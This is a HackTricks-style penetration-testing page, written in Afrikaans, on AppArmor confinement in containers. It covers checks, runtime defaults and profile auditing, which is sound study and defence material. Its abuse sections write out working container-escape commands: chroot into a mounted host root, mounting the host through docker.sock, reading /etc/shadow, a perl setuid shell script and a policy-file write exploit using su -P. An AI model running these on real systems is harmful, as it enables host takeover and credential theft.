# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

AppArmor is ’n **Mandatory Access Control**-stelsel wat beperkings toepas deur profiele vir individuele programme. Anders as tradisionele DAC-kontroles, wat sterk op gebruiker- en groepeienaarskap staatmaak, laat AppArmor die kernel toe om ’n beleid af te dwing wat aan die proses self gekoppel is. In containeromgewings is dit belangrik omdat ’n workload dalk genoeg tradisionele voorregte het om ’n aksie te probeer uitvoer, maar steeds geweier kan word omdat sy AppArmor-profiel nie die betrokke pad-, mount-, netwerkgedrag- of capability-gebruik toelaat nie.

Die belangrikste konseptuele punt is dat AppArmor **padgebaseer** is. Dit beoordeel lêerstelseltoegang aan die hand van padreëls, eerder as etikette soos SELinux dit doen. Dit maak AppArmor toeganklik en kragtig, maar beteken ook dat bind mounts en alternatiewe padreëlings noukeurig oorweeg moet word. As dieselfde inhoud op die host onder ’n ander pad bereikbaar word, stem die uitwerking van die beleid dalk nie ooreen met wat die operateur aanvanklik verwag het nie.

## Rol In Container-isolasie

Containersekuriteitsoorsigte stop dikwels by capabilities en seccomp, maar AppArmor bly ná daardie kontroles belangrik. Stel jou ’n container voor wat meer voorregte as nodig het, of ’n workload wat om operasionele redes een ekstra capability benodig. AppArmor kan steeds lêertoegang, mount-gedrag, netwerkverkeer en uitvoeringspatrone beperk op maniere wat die voor die hand liggende misbruikroete blokkeer. Daarom kan die afskakel van AppArmor “net om die toepassing aan die werk te kry” ’n bloot riskante konfigurasie stilweg omskep in een wat aktief uitgebuit kan word.

## Lab

Gebruik die volgende opdrag om te kyk of AppArmor op die host aktief is:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Om te sien onder watter gebruiker die huidige container-proses loop:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

Die verskil is insiggewend. In die normale geval behoort die proses ’n AppArmor-konteks te wys wat gekoppel is aan die profiel wat deur die runtime gekies is. In die unconfined-geval verdwyn daardie ekstra beperkingslaag.

Jy kan ook nagaan wat Docker dink dit toegepas het:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Looptydgebruik

Docker kan ’n verstek- of pasgemaakte AppArmor-profiel toepas wanneer die gasheer dit ondersteun. Podman kan ook met AppArmor integreer op AppArmor-gebaseerde stelsels, hoewel die ander MAC-stelsel dikwels die voortou neem op SELinux-eerste-verspreidings. Kubernetes kan AppArmor-beleid op werkladingvlak beskikbaar stel op nodusse wat AppArmor werklik ondersteun. LXC en verwante Ubuntu-familie-stelselhoueromgewings gebruik AppArmor ook op groot skaal.

Die praktiese punt is dat AppArmor nie ’n "Docker-funksie" is nie. Dit is ’n gasheerkernelfunksie wat verskeie looptydomgewings kan kies om toe te pas. As die gasheer dit nie ondersteun nie, of as die looptydomgewing opdrag kry om onbeperk te loop, is die veronderstelde beskerming nie werklik daar nie.

Vir Kubernetes spesifiek is die moderne API `securityContext.appArmorProfile`. Sedert Kubernetes `v1.30` is die ouer beta-AppArmor-aantekeninge afgeskaal. Op ondersteunde gashere is `RuntimeDefault` die verstekprofiel, terwyl `Localhost` verwys na ’n profiel wat reeds op die nodus gelaai moet wees. Dit is belangrik tydens ’n hersiening, want ’n manifest kan AppArmor-bewus lyk terwyl dit steeds geheel en al van ondersteuning aan die noduskant en voorafgelaaide profiele afhanklik is.<sup>[[1]](#references)</sup>

Een subtiele maar nuttige operasionele besonderheid is dat die eksplisiete instelling van `appArmorProfile.type: RuntimeDefault` strenger is as om die veld bloot weg te laat. As die veld eksplisiet gestel is en die nodus nie AppArmor ondersteun nie, behoort toelating te misluk. As die veld weggelaat word, kan die werklading steeds op ’n nodus sonder AppArmor loop en bloot nie daardie ekstra beperkingslaag kry nie. Vanuit ’n aanvaller se oogpunt is dit ’n goeie rede om sowel die manifest as die werklike nodustoestand na te gaan.<sup>[[1]](#references)</sup>

Op AppArmor-gashere wat Docker ondersteun, is `docker-default` die bekendste verstekprofiel. Daardie profiel word uit Moby se AppArmor-sjabloon gegenereer en is belangrik omdat dit verduidelik waarom sommige capability-gebaseerde PoCs steeds in ’n verstekhouer misluk. In breë trekke laat `docker-default` gewone netwerkverkeer toe, weier dit skryftoegang tot ’n groot deel van `/proc`, weier dit toegang tot sensitiewe dele van `/sys`, blokkeer dit mount-bewerkings en beperk dit ptrace sodat dit nie ’n algemene primitief vir gasheerverkenning is nie. As jy hierdie basislyn verstaan, kan jy onderskei tussen "die houer het `CAP_SYS_ADMIN`" en "die houer kan daardie vermoë werklik gebruik teen die kernelkoppelvlakke wat vir my saak maak".

## Profielbestuur

AppArmor-profiele word gewoonlik onder `/etc/apparmor.d/` gestoor. ’n Algemene naamkonvensie is om skuinsstrepe in die uitvoerbare lêer se pad met punte te vervang. Byvoorbeeld, ’n profiel vir `/usr/bin/man` word gewoonlik as `/etc/apparmor.d/usr.bin.man` gestoor. Hierdie besonderheid is belangrik vir verdediging sowel as assessering, want sodra jy die aktiewe profielnaam ken, kan jy dikwels die ooreenstemmende lêer vinnig op die gasheer opspoor.

Nuttige bestuursopdragte aan die gasheerkant sluit in:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

Die rede waarom hierdie opdragte belangrik is in ’n verwysing oor container-sekuriteit, is dat hulle verduidelik hoe profiele in die praktyk gebou, gelaai, na complain mode oorgeskakel en ná veranderinge aan toepassings gewysig word. As ’n operateur die gewoonte het om profiele tydens foutopsporing na complain mode oor te skakel en vergeet om enforcement te herstel, kan die container in dokumentasie beskerm lyk terwyl dit in werklikheid baie minder streng beskerm word.

### Profiele bou en opdateer

`aa-genprof` kan die gedrag van toepassings waarneem en help om ’n profiel interaktief te genereer:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` kan ’n profielsjabloon genereer wat later met `apparmor_parser` gelaai kan word:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Wanneer die binary verander en die policy opgedateer moet word, kan aa-logprof weierings in logs herspeel en die operateur help besluit of dit toegelaat of geweier moet word:

```bash
sudo aa-logprof
```

### Logboeke

AppArmor-weierings is dikwels sigbaar via `auditd`, syslog of nutsmiddels soos `aa-notify`:

```bash
sudo aa-notify -s 1 -v
```

Dit is operasioneel en offensief nuttig. Verdedigers gebruik dit om profiele te verfyn. Aanvallers gebruik dit om te leer watter presiese pad of bewerking geblokkeer word en of AppArmor die beheermaatreël is wat ’n exploit chain blokkeer.

### Identifiseer die presiese profiel-lêer

Wanneer ’n runtime ’n spesifieke AppArmor-profielnaam vir ’n container wys, is dit dikwels nuttig om daardie naam terug te koppel aan die profiellêer op skyf:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Dit is veral nuttig tydens ’n hersiening aan die host-kant, omdat dit die gaping oorbrug tussen “die container sê dit loop onder profiel `lowpriv`” en “die werklike reëls is in hierdie spesifieke lêer, wat geoudit of herlaai kan word”.

### Reëls met ’n sterk sein om te oudit

Wanneer jy ’n profiel kan lees, moenie by eenvoudige `deny`-reëls ophou nie. Verskeie reëlsoorte verander wesenlik hoe nuttig AppArmor teen ’n container escape-poging sal wees:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: voer die teikenbinêre uit sonder beperkings. As ’n bereikbare helper, shell of interpreter onder `ux` toegelaat word, is dit gewoonlik die eerste ding om te toets.
- `px` / `Px` en `cx` / `Cx`: voer profieloorgange uit tydens exec. Dit is nie outomaties sleg nie, maar dit is die moeite werd om te oudit omdat ’n oorgang na ’n veel breër profiel as die huidige een kan lei.
- `change_profile`: laat ’n taak toe om na ’n ander gelaaide profiel oor te skakel, onmiddellik of met die volgende exec. As die bestemmingsprofiel swakker is, kan dit die bedoelde ontsnappingsroete uit ’n beperkende domein word.
- `flags=(complain)`, `flags=(unconfined)` of nuwer `flags=(prompt)`: dit behoort te verander hoeveel vertroue jy in die profiel plaas. `complain` teken weierings aan in plaas daarvan om dit af te dwing, `unconfined` verwyder die grens, en `prompt` maak staat op ’n userspace-besluitpad eerder as ’n weiering wat uitsluitlik deur die kernel afgedwing word.
- `userns` of `userns create,`: nuwer AppArmor-beleid kan die skep van user namespaces beheer. As ’n container-profiel dit uitdruklik toelaat, bly geneste user namespaces moontlik, selfs wanneer die platform AppArmor as deel van sy hardening-strategie gebruik.

Nuttige grep aan die host-kant:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Hierdie soort oudit is dikwels nuttiger as om na honderde gewone lêerreëls te staar. As ’n breakout daarvan afhang om ’n helper uit te voer, ’n nuwe namespace binne te gaan of na ’n minder beperkende profiel te ontsnap, lê die antwoord dikwels in hierdie oorganggerigte reëls eerder as in die ooglopende `deny /etc/shadow r`-reëls.

## Wankonfigurasies

Die ooglopendste fout is `apparmor=unconfined`. Administrateurs stel dit dikwels terwyl hulle ’n toepassing ontfout wat misluk het omdat die profiel iets gevaarliks of onverwags tereg geblokkeer het. As die vlag in produksie bly, is die hele MAC-laag in werklikheid verwyder.

Nog ’n subtiele probleem is die aanname dat bind mounts onskadelik is omdat die lêertoestemmings normaal lyk. Omdat AppArmor padgebaseer is, kan die blootstelling van gasheerpaaie onder alternatiewe mount-liggings probleme met padreëls veroorsaak. ’n Derde fout is om te vergeet dat ’n profielnaam in ’n konfigurasielêer min beteken as die gasheerkern nie AppArmor werklik afdwing nie.

## Misbruik

Wanneer AppArmor nie meer aktief is nie, kan bewerkings wat voorheen beperk was, skielik slaag: die lees van sensitiewe paaie deur bind mounts, toegang tot dele van procfs of sysfs wat moeiliker bereikbaar moes bly, die uitvoer van mount-verwante aksies as capabilities/seccomp dit ook toelaat, of die gebruik van paaie wat ’n profiel normaalweg sou weier. AppArmor is dikwels die meganisme wat verduidelik waarom ’n capability-gebaseerde breakout-poging op papier “behoort te werk”, maar in die praktyk steeds misluk. Verwyder AppArmor, en dieselfde poging kan dalk begin slaag.

As jy vermoed dat AppArmor die hoofding is wat ’n path-traversal-, bind-mount- of mount-gebaseerde misbruiksketting keer, is die eerste stap gewoonlik om te vergelyk wat toeganklik word met en sonder ’n profiel. As ’n gasheerpad byvoorbeeld binne die container gemount is, begin deur te kyk of jy dit kan deurkruis en lees:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

As die container ook ’n gevaarlike capability soos `CAP_SYS_ADMIN` het, is een van die mees praktiese toetse om vas te stel of AppArmor die beheermaatreël is wat mount-bewerkings of toegang tot sensitiewe kernlêerstelsels blokkeer:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

In omgewings waar ’n gasheerpad reeds via ’n bind mount beskikbaar is, kan die verlies van AppArmor ook ’n leesalleen-inligtingsopenbaarmakingskwessie in direkte toegang tot gasheerlêers verander:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

Die doel van hierdie opdragte is nie dat AppArmor alleen die breakout veroorsaak nie. Dit is dat wanneer AppArmor verwyder word, baie filesystem- en mount-gebaseerde misbruikpaaie dadelik getoets kan word.

### Volledige voorbeeld: AppArmor gedeaktiveer + Host Root gemount

As die host se wortelgids reeds by `/host` bind-mounted is, kan die verwydering van AppArmor ’n geblokkeerde filesystem-misbruikpad in ’n volledige host-ontsnapping verander:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Sodra die shell deur die host filesystem uitvoer, het die workload effektief die containergrens oorgesteek:

```bash
id
hostname
cat /etc/shadow | head
```

### Volledige voorbeeld: AppArmor gedeaktiveer + Runtime Socket

As AppArmor rondom runtime-toestand die werklike versperring was, kan ’n gemounte socket genoeg wees vir ’n volledige escape:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Die presiese pad hang van die mount point af, maar die eindresultaat is dieselfde: AppArmor verhoed nie meer toegang tot die runtime API nie, en die runtime API kan ’n houer begin wat die gasheer kan kompromitteer.

### Volledige voorbeeld: Padgebaseerde bind-mount-omseiling

Omdat AppArmor padgebaseer is, beskerm die beveiliging van `/proc/**` nie outomaties dieselfde procfs-inhoud op die gasheer wanneer dit via ’n ander pad bereik kan word nie:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

Die impak hang af van wat presies gemount is en of die alternatiewe pad ook ander kontroles omseil, maar hierdie patroon is een van die duidelikste redes waarom AppArmor saam met die mount-uitleg geëvalueer moet word, eerder as in isolasie.

### Volledige voorbeeld: Shebang Bypass

AppArmor kan ’n profiel aan die uitgevoerde skrippad koppel eerder as aan die interpreter waarna die skrip se shebang verwys. Omgekeerd kan die interpreter se profiel gekies word wanneer die interpreter direk aangeroep word. ’n [AppArmor-onderhouer beskryf hierdie onderskeid](https://bugs.launchpad.net/apparmor/+bug/1911431). ’n Historiese voorbeeld het ’n skrip behels waarvan die eerste reël na ’n beperkte interpreter verwys:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

Die voorbeeld is slegs ’n moontlike geval waarin die interpreter se file capability effektief kan word en die script se werklike exec attachment die bewerking toelaat. Gaan die gelaaide beleid en proseslabel, die capability-bounding set, `no_new_privs` en die mount se `nosuid`-status na; ’n profiel se lêernaam of ’n `cap_setuid+ep`-inskrywing bewys nie op sigself dat ’n bruikbare oorgang moontlik is nie. Interpreter-kettings en alternatiewe uitvoeringspaaie moet afsonderlik nagegaan word.

## Beleidsbeheerlêers as ’n bevoorregte skryfprimitief

Op geraakte AppArmor-kerne kan ’n onbevoorregte gebruiker die securityfs-lêer `.load`, `.replace` of `.remove` vir skryf oopmaak, maar ’n direkte `write()` misluk omdat toestemming vir beleidsadministrasie tydens skryf nagegaan word. As ’n setuid-helper daardie lêerbeskrywer as stdout of stderr erf en aanvallerbeheerde grepe skryf, sien die kernel die helper se geloofsbriewe. Dit maak die helper ’n *bevoorregte skrywer* van beleidsdata, nie ’n algemene manier om die oproeper root-toegang te gee nie. Qualys het gewys dat `su -P` grepe van ’n opdrag wat as dieselfde gebruiker loop via sy bevoorregte PTY-pad kan deurgee; dié roete vereis dat ’n wagwoord vir die gebruiker se rekening ingestel is. Gaan die geïnstalleerde kernel- en `su`-regstellings na eerder as om ’n wêreldskryfbare lêermodus as bewys van blootstelling te beskou.<sup>[[3]](#references)[[4]](#references)</sup>

In ’n weggooilaboratorium met ’n geraakte kernel en helper skep hierdie voorbeeld ’n toetsprofiel en verwyder dit daarna. Die shell maak elke beheerlêer oop voordat `su` daarheen skryf; `stty raw` keer dat die PTY-aflos die saamgestelde profielgrepe verander. Moenie die toets teen ’n produksieprofiel uitvoer nie.<sup>[[3]](#references)</sup>

```bash
printf '/usr/bin/true {\n}\n' > /tmp/ht-aa-probe
apparmor_parser -K -o /tmp/ht-aa-probe.pf /tmp/ht-aa-probe
su -P -c 'stty raw && cat /tmp/ht-aa-probe.pf' "$USER" > /sys/kernel/security/apparmor/.load
grep '/usr/bin/true ' /sys/kernel/security/apparmor/profiles
su -P -c 'stty raw && printf %s /usr/bin/true' "$USER" > /sys/kernel/security/apparmor/.remove
```

Dieselfde primitief kan ’n bestaande profiel vervang. ’n Profiel wat byvoorbeeld `userns` vir ’n launcher toelaat, kan ’n AppArmor-beperking op user namespaces verwyder, maar dit verleen nie host-root-vermoëns nie; die werklike namespace-sysctls en ander kontroles bly steeds belangrik. Dit kan ook die beperking op ’n teikenproses verwyder. Gaan die [kernel-blootstellingskontroles](../../../main-system-information/kernel-vulnerability-assessment.md) en die [Linux-hardening-oorsig](../../../) na vir die breër privilege-escalation-werkvloei.<sup>[[3]](#references)[[4]](#references)</sup>

## Kontroles

Die doel van hierdie kontroles is om vinnig drie vrae te beantwoord: is AppArmor op die host geaktiveer, is die huidige proses beperk, en het die runtime werklik ’n profiel op hierdie container toegepas?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Wat hier interessant is:

- As `/proc/self/attr/current` `unconfined` wys, trek die workload nie voordeel uit AppArmor-beperking nie.
- As `aa-status` wys dat AppArmor afgeskakel of nie gelaai is nie, is enige profielnaam in die runtime-konfigurasie meestal kosmeties.
- As `docker inspect` `unconfined` of ’n onverwagte pasgemaakte profiel wys, is dit dikwels die rede waarom ’n lêerstelsel- of mount-gebaseerde misbruikroete werk.
- As `/sys/kernel/security/apparmor/profiles` nie die profiel bevat wat jy verwag het nie, is die runtime- of orkestreerderkonfigurasie op sy eie nie genoeg nie.
- As ’n sogenaamd geharde profiel reëls bevat soos `ux`, breë `change_profile`, `userns` of `flags=(complain)`, kan die werklike grens baie swakker wees as wat die profielnaam aandui.

As ’n container om operasionele redes reeds verhoogde voorregte het, maak dit dikwels die verskil tussen ’n beheerde uitsondering en ’n veel groter sekuriteitsmislukking om AppArmor geaktiveer te laat.

## Runtime-verstekwaardes

| Runtime / platform | Verstektoestand | Verstekgedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Docker Engine | By verstek geaktiveer op AppArmor-versoenbare gashere | Gebruik die `docker-default` AppArmor-profiel, tensy dit oorskryf word | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Afhanklik van die gasheer | AppArmor word deur `--security-opt` ondersteun, maar die presiese verstekwaarde hang van die gasheer/runtime af en is nie so algemeen as Docker se gedokumenteerde `docker-default`-profiel nie | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Voorwaardelike verstekwaarde | As `appArmorProfile.type` nie gespesifiseer is nie, is die verstekwaarde `RuntimeDefault`, maar dit word slegs toegepas wanneer AppArmor op die node geaktiveer is | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` met ’n swak profiel, nodes sonder AppArmor-ondersteuning |
| containerd / CRI-O onder Kubernetes | Afhanklik van node-/runtime-ondersteuning | Algemene Kubernetes-ondersteunde runtimes ondersteun AppArmor, maar werklike afdwinging hang steeds van node-ondersteuning en workload-instellings af | Dieselfde as die Kubernetes-ry; direkte runtime-konfigurasie kan AppArmor ook heeltemal oorslaan |

Vir AppArmor is die **gasheer** dikwels die belangrikste veranderlike, nie net die runtime nie. ’n Profielinstelling in ’n manifest skep nie beperking op ’n node waarop AppArmor nie geaktiveer is nie.



## References

- [1] [Kubernetes-sekuriteitskonteks: AppArmor-profielvelde en gedrag van node-ondersteuning](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)`-manblad: exec-oorgange, `change_profile`, `userns` en profielvlae](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [Qualys CrackArmor-tegniese advies](https://cdn2.qualys.com/advisory/2026/03/10/crack-armor.txt)
- [4] [Ubuntu se kennisbasis oor die CrackArmor-kwesbaarheid](https://ubuntu.com/security/vulnerabilities/crackarmor)
{{#include ../../../../banners/hacktricks-training.md}}
